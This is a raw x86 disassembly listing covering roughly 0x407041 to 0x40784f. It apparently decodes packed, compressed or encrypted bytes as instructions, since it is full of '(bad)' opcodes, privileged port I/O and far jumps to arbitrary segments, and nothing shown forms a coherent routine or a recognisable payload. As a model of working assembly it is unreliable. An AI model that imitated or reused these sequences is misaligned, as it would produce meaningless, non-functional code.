  407041:	sub    BYTE PTR [edx+esi*8+0x10a94a73],al
  407048:	adc    al,0xe4
  40704a:	pop    esp
  40704b:	add    BYTE PTR [edx+0x3b],bh
  40704e:	pop    es
  40704f:	cmc    
  407050:	shr    BYTE PTR [esi+0x3f1807b2],cl
  407056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407057:	push   ebp
  407058:	sar    DWORD PTR [edi],1
  40705a:	add    eax,0xa6481248
  40705f:	lock and al,0xdb
  407062:	jp     0x406ff9
  407064:	lods   eax,DWORD PTR ds:[esi]
  407065:	scas   eax,DWORD PTR es:[edi]
  407066:	dec    edx
  407067:	int    0x92
  407069:	dec    edx
  40706a:	ret    0xadb4
  40706d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40706e:	ror    DWORD PTR [edx+0x48359873],1
  407074:	(bad)  
  407075:	sbb    DWORD PTR [ebx-0x735eccb6],edx
  40707b:	pop    esi
  40707c:	push   edi
  40707d:	scas   eax,DWORD PTR es:[edi]
  40707e:	jmp    0xa9c6:0xe571b0d8
  407085:	fcom   st(5)
  407087:	mov    ebp,0x40a1a09f
  40708c:	adc    BYTE PTR [ecx+0x7868bd5e],bh
  407092:	leave  
  407093:	test   BYTE PTR [ecx],0x2e
  407096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407097:	call   0xadc6:0xcd9c6994
  40709e:	sbb    al,BYTE PTR [edi+esi*2-0x3f50307a]
  4070a5:	xor    eax,0xa1011509
  4070aa:	repz adc ch,dh
  4070ad:	rcl    BYTE PTR [eax-0x25],0x63
  4070b1:	ret    0x49b5
  4070b4:	mov    bh,0x71
  4070b6:	icebp  
  4070b7:	cmp    DWORD PTR [ebx+0x70],ecx
  4070ba:	out    dx,al
  4070bb:	lock xor BYTE PTR [ebp+0x1db2893f],al
  4070c2:	in     al,dx
  4070c3:	mov    ecx,0x87363a79
  4070c8:	cmp    cl,BYTE PTR [ecx+0x7a534541]
  4070ce:	jl     0x40708b
  4070d0:	adc    DWORD PTR [esi+0x23],edx
  4070d3:	sbb    eax,0x489cd7bb
  4070d8:	mov    al,0x4b
  4070da:	add    ebx,esp
  4070dc:	(bad)  
  4070dd:	shr    ecx,cl
  4070df:	adc    DWORD PTR [esi-0x3d65751b],eax
  4070e5:	inc    edi
  4070e6:	sub    esp,DWORD PTR ds:0x2a309226
  4070ec:	cli    
  4070ed:	stos   DWORD PTR es:[edi],eax
  4070ee:	mov    edx,0xc538500e
  4070f3:	pop    edx
  4070f4:	pop    ss
  4070f5:	ret    
  4070f6:	push   ebp
  4070f7:	pushf  
  4070f8:	sub    BYTE PTR [ebx+edx*2],al
  4070fb:	jl     0x407084
  4070fd:	(bad)  
  4070fe:	jle    0x407085
  407100:	xchg   DWORD PTR [eax-0x1e],ecx
  407103:	ret    
  407104:	jle    0x40717e
  407106:	loope  0x407099
  407108:	les    edx,FWORD PTR [esi+0x30]
  40710b:	test   eax,0x49b6eeb6
  407110:	jmp    DWORD PTR [ebx-0x21646276]
  407116:	mov    dh,0xc0
  407118:	dec    esp
  407119:	cwde   
  40711a:	fsin   
  40711c:	(bad)  
  40711e:	data16 in al,dx
  407120:	xchg   edx,eax
  407121:	mov    ds:0x1ef65c81,eax
  407126:	sahf   
  407127:	jb     0x40711d
  407129:	ret    0xc930
  40712c:	pop    esp
  40712d:	mov    ah,0xcd
  40712f:	ds push es
  407131:	ins    DWORD PTR es:[edi],dx
  407132:	popf   
  407133:	push   ecx
  407134:	imul   esp,DWORD PTR [esi+0x33],0x77b338b2
  40713b:	dec    ebx
  40713c:	push   es
  40713d:	jnp    0x4071ac
  40713f:	retf   0x5e63
  407142:	xor    DWORD PTR gs:[ecx],ebp
  407145:	imul   edx,DWORD PTR [esi-0x4f],0xffffff83
  407149:	add    eax,0x954b35a
  40714e:	arpl   WORD PTR [ebx+0x6d],dx
  407151:	call   0x12d3:0xfb6d04d3
  407158:	shr    BYTE PTR [edi+0x57fed77b],0xc1
  40715f:	out    dx,al
  407160:	sub    ch,al
  407162:	cmp    eax,DWORD PTR [ebx-0x1a]
  407165:	mov    cl,BYTE PTR [eax+0x6f1aec63]
  40716b:	mov    dh,0x40
  40716d:	fild   DWORD PTR [edx]
  40716f:	lahf   
  407170:	outs   dx,BYTE PTR ss:[esi]
  407172:	inc    edi
  407173:	sub    cl,BYTE PTR [edx-0x1d]
  407176:	(bad)  [edi+0x45877dca]
  40717c:	daa    
  40717d:	ret    0xa93d
  407180:	and    edx,DWORD PTR [edx]
  407182:	xchg   DWORD PTR [edi-0x507aed81],ebx
  407188:	imul   esi,ebx,0x3f1ac565
  40718e:	retf   
  40718f:	and    dl,BYTE PTR [ebp+ebp*8-0x28e94e59]
  407196:	and    esi,DWORD PTR [ecx+edx*4]
  407199:	icebp  
  40719a:	adc    eax,0x35804efa
  40719f:	ins    DWORD PTR es:[edi],dx
  4071a0:	mov    bh,0xec
  4071a2:	test   BYTE PTR [ecx+0x52],0x18
  4071a6:	xchg   edx,eax
  4071a7:	cdq    
  4071a8:	ins    BYTE PTR es:[edi],dx
  4071a9:	cmp    esp,DWORD PTR [ecx+0x2eca8224]
  4071af:	xor    BYTE PTR [ebp-0x5c871887],bh
  4071b5:	das    
  4071b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071b7:	js     0x4071be
  4071b9:	inc    ebx
  4071ba:	(bad)  
  4071bb:	fist   DWORD PTR [ebx-0x44]
  4071be:	xchg   ebp,eax
  4071bf:	dec    esp
  4071c0:	add    ch,ah
  4071c2:	dec    ecx
  4071c3:	inc    esp
  4071c4:	sub    BYTE PTR [ecx+0x77],0x65
  4071c8:	pop    eax
  4071c9:	sahf   
  4071ca:	sbb    al,0x57
  4071cc:	int    0x34
  4071ce:	test   eax,0x700e1a0b
  4071d3:	hlt    
  4071d4:	lea    esi,[esi]
  4071d6:	mov    ebx,DWORD PTR [ebp-0x46]
  4071d9:	fs xchg esp,eax
  4071db:	sbb    bl,cl
  4071dd:	out    0x6d,eax
  4071df:	mov    dl,BYTE PTR [ebx+eiz*4-0xa]
  4071e3:	mov    es,WORD PTR [ebp-0x66]
  4071e6:	cmp    eax,0x6216d4e4
  4071eb:	push   ss
  4071ec:	out    dx,al
  4071ed:	push   ebx
  4071ee:	inc    esp
  4071ef:	out    dx,eax
  4071f0:	push   edi
  4071f1:	push   eax
  4071f2:	retf   
  4071f3:	repnz dec esp
  4071f5:	arpl   sp,bx
  4071f7:	push   ds
  4071f8:	push   edx
  4071f9:	dec    ebx
  4071fa:	xor    eax,0x6cd02638
  4071ff:	push   ebx
  407200:	out    0x94,eax
  407202:	test   DWORD PTR [ebp+0x6a5c190c],ecx
  407208:	(bad)  
  407209:	ss pop edi
  40720b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40720c:	in     al,dx
  40720d:	mov    eax,0x3345e05a
  407212:	test   al,0x55
  407214:	xchg   BYTE PTR [eax+0x40],al
  407217:	or     esp,DWORD PTR [ecx]
  407219:	aas    
  40721a:	int3   
  40721b:	lods   al,BYTE PTR ds:[esi]
  40721c:	sub    BYTE PTR [eax+0x6d16b383],ch
  407222:	pop    esp
  407223:	push   es
  407224:	icebp  
  407225:	xchg   edi,eax
  407226:	sbb    ecx,edx
  407228:	mov    bl,BYTE PTR [edx]
  40722a:	dec    edx
  40722b:	mov    esi,0xd298dd81
  407230:	stos   BYTE PTR es:[edi],al
  407231:	jbe    0x4072a3
  407233:	test   eax,0x5d5d1b4e
  407238:	inc    ebx
  407239:	jo     0x4071dd
  40723b:	(bad)  
  40723c:	ss out 0xbb,eax
  40723f:	sahf   
  407240:	sub    cl,BYTE PTR [esp+eax*2-0x7]
  407244:	adc    cl,0xc3
  407247:	(bad)  
  407248:	retf   
  407249:	xchg   dl,bh
  40724b:	pushf  
  40724c:	dec    BYTE PTR [ebp-0x3e]
  40724f:	jo     0x407214
  407251:	cld    
  407252:	dec    ebp
  407253:	mov    cl,0xab
  407255:	dec    edx
  407256:	cmp    ch,BYTE PTR [esi+0x3bbfea3b]
  40725c:	retf   0xa46a
  40725f:	fcom   st(6)
  407261:	sub    al,0x9b
  407263:	mov    esp,DWORD PTR [edx+eiz*4+0x343581ca]
  40726a:	adc    ebp,DWORD PTR [esi-0x7383159a]
  407270:	pop    es
  407271:	int    0x9a
  407273:	sti    
  407274:	pushf  
  407275:	pop    esi
  407276:	sbb    DWORD PTR [ebp-0x5f5f31b],edi
  40727c:	ss push 0xff3316fd
  407282:	jmp    0x9056:0x7ecd150f
  407289:	lock popa 
  40728b:	jbe    0x40721b
  40728d:	imul   ecx,DWORD PTR [ecx],0xffffff9f
  407290:	popf   
  407291:	std    
  407292:	xchg   ebp,eax
  407293:	retf   0xb2a6
  407296:	fisubr DWORD PTR [ecx]
  407298:	into   
  407299:	xchg   edx,eax
  40729a:	(bad)  
  40729b:	xchg   ebp,eax
  40729c:	dec    esp
  40729d:	nop
  40729e:	int    0xd3
  4072a0:	sub    bl,BYTE PTR [eax+0x2a]
  4072a3:	imul   esp,esi,0x18
  4072a6:	and    DWORD PTR [ebp+0x6c],eax
  4072a9:	xor    al,0xa2
  4072ab:	subps  xmm7,XMMWORD PTR ds:0x4a5072b7
  4072b2:	out    dx,al
  4072b3:	lock xchg DWORD PTR [ebx],eax
  4072b6:	jae    0x40725d
  4072b8:	(bad)  
  4072b9:	aad    0xe
  4072bb:	loope  0x40726c
  4072bd:	or     ebx,DWORD PTR [edx]
  4072bf:	inc    esi
  4072c0:	or     eax,0x6279ee96
  4072c5:	ror    BYTE PTR [ebx+0x26365291],cl
  4072cb:	mov    dh,0x52
  4072cd:	xchg   ebp,eax
  4072ce:	jle    0x40731d
  4072d0:	sub    al,0x3a
  4072d2:	lods   eax,DWORD PTR ds:[esi]
  4072d3:	fld    DWORD PTR [eax+edi*2-0x18]
  4072d7:	pop    esi
  4072d8:	repz xrelease mov BYTE PTR [edx-0x3b],dh
  4072dd:	or     edx,DWORD PTR [esi]
  4072df:	jl     0x40726d
  4072e1:	mov    ebp,0xec18a580
  4072e6:	sbb    dl,BYTE PTR [ebx]
  4072e8:	imul   edx,DWORD PTR [ebx+0x7c],0xd6c64f25
  4072ef:	push   ds
  4072f0:	maxps  xmm7,XMMWORD PTR [esi]
  4072f3:	sbb    eax,0xd35b08df
  4072f8:	aad    0xe0
  4072fa:	stc    
  4072fb:	and    eax,0xda383fd2
  407300:	push   esp
  407301:	sub    BYTE PTR [ebx],ch
  407303:	mov    BYTE PTR [edi+0x55abc28b],ah
  407309:	fwait
  40730a:	dec    ebx
  40730b:	mov    esi,0x9e78346c
  407310:	std    
  407311:	aam    0x5c
  407313:	sti    
  407314:	and    edi,edi
  407316:	inc    ebx
  407317:	lods   eax,DWORD PTR ds:[esi]
  407318:	mov    gs:0x20869922,eax
  40731e:	dec    edi
  40731f:	shr    BYTE PTR [edi],1
  407321:	arpl   WORD PTR [ebp-0x4347accd],bp
  407327:	(bad)  
  407328:	jmp    0xfbe9:0xb5858ce5
  40732f:	scas   eax,DWORD PTR es:[edi]
  407330:	sar    DWORD PTR [edx+eax*1+0x13],0x4b
  407335:	mov    bh,0x71
  407337:	xchg   ecx,eax
  407338:	neg    esi
  40733a:	and    dh,BYTE PTR gs:[eax-0x48]
  40733e:	fidivr WORD PTR [esi]
  407340:	(bad)  
  407341:	cmp    ebx,DWORD PTR [esi+0x11]
  407344:	push   ss
  407345:	mov    esp,0xecbc349b
  40734a:	retf   
  40734b:	test   ecx,eax
  40734d:	clc    
  40734e:	rcl    ebx,cl
  407350:	aas    
  407351:	add    ch,bh
  407353:	call   0x6615:0xccb52a37
  40735a:	push   edi
  40735b:	repnz adc eax,DWORD PTR [ecx-0x7e9fcaf6]
  407362:	sub    eax,0x2177dc6c
  407367:	xchg   edx,eax
  407368:	xor    bl,BYTE PTR [edx]
  40736a:	nop
  40736b:	xchg   ecx,eax
  40736c:	mov    eax,0x76a944db
  407371:	adc    eax,0x49cbc68d
  407376:	adc    eax,0x563482e8
  40737b:	je     0x407318
  40737d:	pusha  
  40737e:	mov    ds:0xc4f94efa,al
  407383:	jle    0x40737a
  407385:	mov    ecx,0x36963b32
  40738a:	call   0x2c38:0xcc2acbd6
  407391:	je     0x407406
  407393:	daa    
  407394:	inc    esp
  407395:	mov    cl,0xc8
  407397:	out    0xb6,al
  407399:	add    bp,si
  40739c:	je     0x407328
  40739e:	rol    DWORD PTR [esi],cl
  4073a0:	pushf  
  4073a1:	loopne 0x40739a
  4073a3:	and    eax,0xb72930a5
  4073a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a9:	dec    esi
  4073aa:	pusha  
  4073ab:	fcmove st,st(4)
  4073ad:	adc    bh,bl
  4073af:	cwde   
  4073b0:	or     ebx,ebx
  4073b2:	jp     0x407369
  4073b4:	call   0xfd527b40
  4073b9:	fisubr DWORD PTR [edx-0x41f2052a]
  4073c0:	push   ds
  4073c1:	jbe    0x40739f
  4073c3:	dec    esp
  4073c4:	adc    BYTE PTR [esi+0x2305ad0e],bh
  4073ca:	push   ss
  4073cb:	mov    eax,0xa3611b54
  4073d0:	lahf   
  4073d1:	mov    ebx,gs
  4073d3:	mov    eax,0xb960dd35
  4073d8:	out    0x4f,al
  4073da:	inc    esp
  4073db:	mov    esp,0x8965b26
  4073e0:	int    0x83
  4073e2:	and    al,0xf2
  4073e4:	js     0x4073a8
  4073e6:	int    0x7f
  4073e8:	adc    BYTE PTR [esi],ah
  4073ea:	jecxz  0x40738a
  4073ec:	hlt    
  4073ed:	retf   
  4073ee:	and    BYTE PTR [edi-0x49],ah
  4073f1:	xchg   esi,eax
  4073f2:	imul   ebx,ecx,0xfc655fa7
  4073f8:	mov    ecx,0x947d6138
  4073fd:	inc    esp
  4073fe:	add    ecx,DWORD PTR [esi]
  407400:	sub    DWORD PTR [esi-0x2a3dbdea],0xc
  407407:	lods   al,BYTE PTR ds:[esi]
  407408:	mov    cl,0x96
  40740a:	test   eax,0xfbc9d236
  40740f:	inc    ecx
  407410:	fwait
  407411:	sub    eax,0xc3f35597
  407416:	je     0x40740e
  407418:	imul   esi,DWORD PTR [ecx],0xffffffc3
  40741b:	pop    edi
  40741c:	mov    dh,0x21
  40741e:	push   cs
  40741f:	mov    bl,0xe5
  407421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407422:	jecxz  0x407416
  407424:	adc    cl,BYTE PTR [edi+0x3fb4b314]
  40742a:	jne    0x4073c9
  40742c:	lds    esp,FWORD PTR [eax+0x20]
  40742f:	(bad)  
  407430:	repnz cmp esp,DWORD PTR [ecx]
  407433:	daa    
  407434:	fst    QWORD PTR [esi+edx*4+0x34]
  407438:	in     eax,dx
  407439:	cs mov bh,0x40
  40743c:	or     al,0xbc
  40743e:	pop    ebp
  40743f:	mov    esp,0xb3a163ce
  407444:	js     0x4074b5
  407446:	(bad)  
  407447:	jg     0x407492
  407449:	add    DWORD PTR [ebp+0x77],eax
  40744c:	or     ebp,esp
  40744e:	pop    es
  40744f:	mov    al,0x89
  407451:	xor    bl,ch
  407453:	dec    ecx
  407454:	inc    eax
  407455:	leave  
  407456:	imul   ch
  407458:	sbb    eax,0x77378459
  40745d:	or     eax,0x1229d414
  407462:	shld   ecx,esi,cl
  407465:	jnp    0x4074b5
  407467:	sub    dl,BYTE PTR [eax+ecx*4-0x30ce59af]
  40746e:	xchg   ecx,eax
  40746f:	or     al,0x86
  407471:	sti    
  407472:	icebp  
  407473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407474:	das    
  407475:	adc    eax,0xc23e26a
  40747a:	stos   DWORD PTR es:[edi],eax
  40747b:	aas    
  40747c:	mov    al,ds:0x2d72dff4
  407481:	or     eax,0xf66068f3
  407486:	cmp    esp,DWORD PTR [ebp+0x48]
  407489:	mov    ds:0x9a8fad4a,eax
  40748e:	out    0x41,al
  407490:	mov    dl,0xe7
  407492:	add    eax,0x808caa1e
  407497:	les    esp,FWORD PTR [eax-0x20be3f79]
  40749d:	mov    eax,ds:0x5dbd43d3
  4074a2:	sub    ebx,DWORD PTR [ebx+ebx*8]
  4074a5:	cmp    ebx,DWORD PTR [esi+0x18]
  4074a8:	inc    edx
  4074a9:	xchg   DWORD PTR [ecx-0x27a2619d],edx
  4074af:	push   ebx
  4074b0:	cmp    eax,0xa19b26d9
  4074b5:	push   0x9
  4074b7:	inc    esi
  4074b8:	cmp    al,0xf9
  4074ba:	or     bl,BYTE PTR [esi]
  4074bc:	sub    ch,BYTE PTR [ebx]
  4074be:	mov    ds:0x2dbee9b4,eax
  4074c3:	and    DWORD PTR [ecx+0x2c],edx
  4074c6:	or     eax,0x5e7b9658
  4074cb:	cmp    DWORD PTR [ecx+0x3a],ebx
  4074ce:	mov    esi,0xf51cee34
  4074d3:	pop    edi
  4074d4:	cld    
  4074d5:	iret   
  4074d6:	mov    esi,DWORD PTR [esi-0x26dc965f]
  4074dc:	dec    eax
  4074dd:	mov    dl,BYTE PTR [edx]
  4074df:	add    bl,0xc7
  4074e2:	dec    eax
  4074e3:	js     0x40754d
  4074e5:	dec    ebx
  4074e6:	xor    BYTE PTR [ebp-0x65],cl
  4074e9:	sub    BYTE PTR [ecx],ah
  4074eb:	adc    BYTE PTR [ebp-0x15719968],ch
  4074f1:	sub    dl,BYTE PTR [ecx+0x6b]
  4074f4:	outs   dx,BYTE PTR ds:[esi]
  4074f5:	add    al,0xdb
  4074f7:	in     eax,dx
  4074f8:	jno    0x407483
  4074fa:	cmp    ch,cl
  4074fc:	repz pushf 
  4074fe:	lahf   
  4074ff:	mov    edi,0x7c53754e
  407504:	mov    cl,0xed
  407506:	icebp  
  407507:	xor    edx,DWORD PTR [ebx]
  407509:	xor    ch,BYTE PTR [edi-0x173f9a9f]
  40750f:	(bad)  
  407510:	test   al,0xc5
  407512:	pop    ds
  407513:	bound  ebp,QWORD PTR [ebp-0x72c317c7]
  407519:	scas   al,BYTE PTR es:[edi]
  40751a:	stos   BYTE PTR es:[edi],al
  40751b:	mov    dh,0xe3
  40751d:	xchg   esi,eax
  40751e:	aas    
  40751f:	jo     0x407546
  407521:	test   al,0x54
  407523:	js     0x4075a0
  407525:	cld    
  407526:	add    bh,BYTE PTR ds:0xe8033a7
  40752c:	and    edx,eax
  40752e:	int3   
  40752f:	push   ds
  407530:	cmp    BYTE PTR [ecx+0x7a],ch
  407533:	es push esi
  407535:	imul   eax
  407537:	push   edi
  407538:	int    0x17
  40753a:	aaa    
  40753b:	jbe    0x4075ad
  40753d:	dec    ebx
  40753e:	push   ecx
  40753f:	jns    0x4074d0
  407541:	(bad)  
  407543:	or     al,0x8d
  407545:	jmp    0x383bb22b
  40754a:	xor    esp,DWORD PTR [edi-0x78c88820]
  407550:	pop    ecx
  407551:	and    esi,DWORD PTR ds:0x6e508d19
  407557:	sti    
  407558:	adc    ah,BYTE PTR [ecx]
  40755a:	push   eax
  40755b:	dec    esi
  40755c:	cmp    eax,0x263087b5
  407561:	inc    ebp
  407562:	or     al,0xe5
  407564:	xchg   ebx,eax
  407565:	js     0x40757e
  407567:	mov    edi,esi
  407569:	jae    0x4074f3
  40756b:	test   BYTE PTR [ebp-0x123fba78],ah
  407571:	test   BYTE PTR [ebx+0x71],ch
  407574:	retf   
  407575:	or     bh,al
  407577:	jge    0x4075aa
  407579:	out    dx,eax
  40757a:	cmp    esp,edi
  40757c:	call   0x11519676
  407581:	out    0xe8,al
  407583:	rcl    bl,cl
  407585:	test   al,0xab
  407587:	inc    eax
  407588:	push   ebp
  407589:	leave  
  40758a:	cwde   
  40758b:	sbb    edx,DWORD PTR [eax+0x2f]
  40758e:	loope  0x4075ac
  407590:	jg     0x4075c9
  407592:	and    al,dh
  407594:	or     al,0x1b
  407596:	std    
  407597:	in     al,dx
  407598:	jl     0x4075d2
  40759a:	(bad)
  40759d:	jp     0x4075cd
  40759f:	dec    esi
  4075a0:	outs   dx,BYTE PTR ds:[esi]
  4075a1:	int3   
  4075a2:	mov    ebx,0xcab07470
  4075a7:	neg    edi
  4075a9:	in     eax,dx
  4075aa:	and    DWORD PTR [edi],edx
  4075ac:	fs fst st(3)
  4075af:	nop
  4075b0:	dec    ebp
  4075b1:	(bad)  
  4075b2:	(bad)  
  4075b4:	repnz cmp BYTE PTR [ecx],al
  4075b7:	mov    BYTE PTR [edi+0x6bd0a613],bl
  4075bd:	test   eax,0x4e73c122
  4075c2:	and    DWORD PTR [edi-0x5f],edi
  4075c5:	jb     0x40754f
  4075c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c8:	jb     0x4075c8
  4075ca:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4075cc:	test   eax,0x29ada4b2
  4075d1:	push   0xdafa8a0a
  4075d6:	clc    
  4075d7:	push   esp
  4075d8:	sub    dh,al
  4075da:	inc    ebp
  4075db:	mov    edx,0xb97c6f58
  4075e0:	xchg   edx,eax
  4075e1:	jmp    0xd6ef:0x6b281ff5
  4075e8:	xchg   bh,dh
  4075ea:	fiadd  DWORD PTR [ebx+0x4c]
  4075ed:	push   esi
  4075ee:	fst    st(1)
  4075f0:	leave  
  4075f1:	xchg   esi,eax
  4075f2:	call   0x8f62be64
  4075f7:	lahf   
  4075f8:	loop   0x4075d4
  4075fa:	push   ebp
  4075fb:	mov    dh,0x1a
  4075fd:	cld    
  4075fe:	or     ecx,DWORD PTR [ebp-0x20cdb87f]
  407604:	dec    ebx
  407605:	inc    edx
  407606:	and    eax,0xc47fd06d
  40760b:	mov    ah,0x61
  40760d:	int3   
  40760e:	ss repnz fdivr st(5),st
  407612:	lds    esi,FWORD PTR [ebx+0x4f]
  407615:	lahf   
  407616:	sub    al,0xf8
  407618:	ja     0x4075bd
  40761a:	out    dx,al
  40761b:	or     edx,DWORD PTR [edi]
  40761d:	inc    eax
  40761e:	retf   0x9022
  407621:	fwait
  407622:	mov    ebx,0xc0e85247
  407628:	mov    ebx,0x9361a0fb
  40762d:	add    eax,0xd8e0f49c
  407632:	(bad)  
  407633:	pop    ebp
  407634:	add    al,0xc0
  407636:	push   ss
  407637:	lock xchg DWORD PTR [esp+edi*1+0x153ccc43],ebx
  40763f:	pushf  
  407640:	sbb    BYTE PTR [edi+0x6b8503f3],0xa9
  407647:	fwait
  407648:	xor    eax,0xc830e4e8
  40764d:	jbe    0x407696
  40764f:	imul   ecx,DWORD PTR [edi+0x50],0xef519c12
  407656:	xchg   ebp,eax
  407657:	rcl    esi,cl
  407659:	sbb    eax,0x5128d1e9
  40765e:	mov    ecx,0x4761bf0b
  407663:	gs xchg ebx,eax
  407665:	mov    bh,0xa2
  407667:	pop    ds
  407668:	jmp    0x40762b
  40766a:	stos   BYTE PTR es:[edi],al
  40766b:	in     eax,dx
  40766c:	adc    ebx,edx
  40766e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40766f:	mov    eax,0xa013b33b
  407674:	mov    BYTE PTR [ebx],cl
  407676:	add    BYTE PTR [ecx+0x66],ch
  407679:	xor    dl,dh
  40767b:	jp     0x407621
  40767d:	jmp    0xd36fb471
  407682:	inc    ebp
  407683:	jo     0x40769f
  407685:	xchg   ebx,eax
  407686:	fild   WORD PTR [edx]
  407688:	jmp    0xc671:0xd1d2ddc1
  40768f:	dec    esi
  407690:	iret   
  407691:	jne    0x407678
  407693:	sub    eax,0x5dd2faa5
  407698:	mov    esi,0xf7cfee08
  40769d:	iret   
  40769e:	outs   dx,BYTE PTR ds:[esi]
  40769f:	jecxz  0x407685
  4076a1:	sti    
  4076a2:	mov    edi,0x3cffa7c8
  4076a7:	mov    al,0x70
  4076a9:	iret   
  4076aa:	(bad)  
  4076ab:	inc    eax
  4076ac:	call   0xc91d:0x9e1f621e
  4076b3:	sbb    edx,DWORD PTR [ebx+0x60edffb2]
  4076b9:	push   ds
  4076ba:	push   cs
  4076bb:	push   edx
  4076bc:	xor    esp,DWORD PTR ds:0x363caf4f
  4076c2:	cmp    DWORD PTR [ecx+0x17],eax
  4076c5:	xlat   BYTE PTR ds:[ebx]
  4076c6:	int    0x62
  4076c8:	not    bh
  4076ca:	adc    esp,esp
  4076cc:	adc    al,0xf8
  4076ce:	cmp    DWORD PTR [edi+0x55],ecx
  4076d1:	sbb    bl,BYTE PTR [esp+edx*4-0x12]
  4076d5:	or     dl,BYTE PTR [esi-0x7c683737]
  4076db:	dec    eax
  4076dc:	lods   eax,DWORD PTR ds:[esi]
  4076dd:	js     0x407747
  4076df:	pop    eax
  4076e0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076e2:	push   es
  4076e3:	repz aad 0x32
  4076e6:	int    0xd6
  4076e8:	lock fs push ss
  4076eb:	sbb    eax,0xb931e08d
  4076f0:	inc    eax
  4076f1:	ds mov dl,0x0
  4076f4:	popf   
  4076f5:	stos   BYTE PTR es:[edi],al
  4076f6:	add    DWORD PTR [ecx+0x461a7cb7],0x5c
  4076fd:	neg    WORD PTR [ebx+0x22708bba]
  407704:	or     al,0xc7
  407706:	jmp    0x9565:0x4030675c
  40770d:	dec    ecx
  40770e:	shl    DWORD PTR [ebx],0x4c
  407711:	and    DWORD PTR [ebp+0x33992d62],0xffffffa3
  407718:	pop    ebp
  407719:	push   esi
  40771a:	push   edx
  40771b:	cmp    BYTE PTR [ebp+edx*8+0x4548450d],ch
  407722:	lds    edx,FWORD PTR [ecx-0x3]
  407725:	popf   
  407726:	push   0x59
  407728:	inc    edi
  407729:	dec    ebx
  40772a:	dec    ebp
  40772b:	push   edi
  40772c:	and    cl,dh
  40772e:	and    ch,bl
  407730:	jo     0x40778a
  407732:	fucom  st(4)
  407734:	xchg   esp,eax
  407735:	outs   dx,DWORD PTR ds:[esi]
  407736:	mov    eax,ds:0x736f8764
  40773b:	(bad)  
  40773d:	dec    esp
  40773e:	xchg   DWORD PTR [eax+edi*2+0x45ae188],ebx
  407745:	lock cli 
  407747:	and    al,0x2c
  407749:	add    eax,0x80f47457
  40774e:	(bad)  
  40774f:	mov    dl,0xf4
  407751:	xchg   al,dl
  407753:	xchg   ecx,eax
  407754:	jge    0x407703
  407756:	fwait
  407757:	into   
  407758:	arpl   cx,bx
  40775a:	shr    BYTE PTR [eax],0x90
  40775d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40775e:	inc    ebx
  40775f:	(bad)  
  407761:	cmp    al,0x99
  407763:	jne    0x407781
  407765:	and    DWORD PTR [ebp-0x7bab674d],eax
  40776b:	test   BYTE PTR [esp+esi*1-0x14c87a4],dl
  407772:	aas    
  407773:	adc    BYTE PTR [ecx+eiz*1-0x44],dl
  407777:	mov    eax,0x49375a95
  40777c:	repnz sbb al,0x2d
  40777f:	cmp    BYTE PTR [ebp+0x10],dh
  407782:	arpl   WORD PTR [ebx+0x1dd051ca],bp
  407788:	jl     0x4077aa
  40778a:	or     eax,0x78932959
  40778f:	xchg   ebx,eax
  407790:	daa    
  407791:	imul   eax,DWORD PTR [eax+0x5b],0x1a706307
  407798:	cmp    ah,BYTE PTR [ecx-0x39]
  40779b:	fs and eax,0x2339737e
  4077a1:	into   
  4077a2:	xchg   BYTE PTR [esi-0x23],ah
  4077a5:	int    0xbc
  4077a7:	dec    esp
  4077a8:	or     bh,BYTE PTR [eax]
  4077aa:	xor    edi,DWORD PTR ds:[esi+0x9a24429]
  4077b1:	add    dh,BYTE PTR [esi]
  4077b3:	std    
  4077b4:	mov    cl,0x6b
  4077b6:	addr16 fs int3 
  4077b9:	dec    eax
  4077ba:	stc    
  4077bb:	mov    WORD PTR [ebp+0x5c],?
  4077be:	xor    al,0x3
  4077c0:	out    dx,eax
  4077c1:	jl     0x407797
  4077c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077c4:	lea    edi,[edx+0x2b5f2193]
  4077ca:	shl    DWORD PTR [esi],1
  4077cc:	loope  0x407819
  4077ce:	pop    ecx
  4077cf:	push   ecx
  4077d0:	dec    ebx
  4077d1:	xchg   ebx,eax
  4077d2:	shl    DWORD PTR [ebx+0x4b],0x19
  4077d6:	jbe    0x407799
  4077d8:	mov    dl,0xb6
  4077da:	fst    QWORD PTR [ebp+0x57]
  4077dd:	add    esi,DWORD PTR [edx]
  4077df:	xor    bh,BYTE PTR [eax+0xfa452b6]
  4077e5:	test   al,0xb1
  4077e7:	rcr    BYTE PTR [ebp+edx*8+0x53d11bdb],1
  4077ee:	ss cmp al,0x9b
  4077f1:	arpl   WORD PTR [ecx+0x674cbefe],bx
  4077f7:	sub    DWORD PTR [ecx+eiz*4-0x395c5b91],ebp
  4077fe:	xor    BYTE PTR [eax+0x7bc4403f],0x5a
  407805:	push   ebx
  407806:	push   ebp
  407807:	lods   eax,DWORD PTR ds:[esi]
  407808:	mov    eax,0xee5ee7da
  40780d:	inc    edx
  40780e:	jge    0x40780c
  407810:	int    0xaa
  407812:	mov    eax,esi
  407814:	adc    al,0x7c
  407816:	xor    eax,0x85af2984
  40781b:	outs   dx,BYTE PTR ds:[esi]
  40781c:	in     al,dx
  40781d:	sbb    BYTE PTR [edx],dh
  40781f:	mov    eax,0x2eaafadf
  407824:	ficomp WORD PTR [ebx+0x74]
  407827:	mov    ebx,0xf0701fbd
  40782c:	(bad)
  40782f:	les    eax,FWORD PTR [edx+eax*4+0x369885a9]
  407836:	or     bh,BYTE PTR [esi-0x2f]
  407839:	or     al,0x77
  40783b:	push   eax
  40783c:	enter  0x9d82,0xcf
  407840:	jg     0x4077f6
  407842:	sti    
  407843:	aad    0x82
  407845:	or     edx,DWORD PTR [ebx]
  407847:	das    
  407848:	or     BYTE PTR [ebx+0x14],0xc6
  40784c:	pop    ebp
  40784d:	sub    al,dh
  40784f:	xor    eax,esp
